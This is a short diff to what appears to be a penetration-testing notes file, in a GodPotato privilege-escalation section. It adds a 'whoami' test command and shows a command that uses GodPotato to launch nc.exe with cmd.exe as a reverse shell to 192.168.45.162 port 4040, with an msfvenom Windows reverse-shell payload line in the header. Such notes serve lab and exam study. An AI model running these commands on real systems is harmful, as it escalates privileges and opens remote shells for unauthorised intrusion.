@@ -396,6 +396,8 @@ msfvenom -p windows/x64/shell_reverse_tcp -f exe
 
 ### GodPotato
 ```powershell
+.\god.exe -cmd "whoami"
+
 .\GodPotato.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe -e cmd.exe 192.168.45.162 4040"
 ```
 
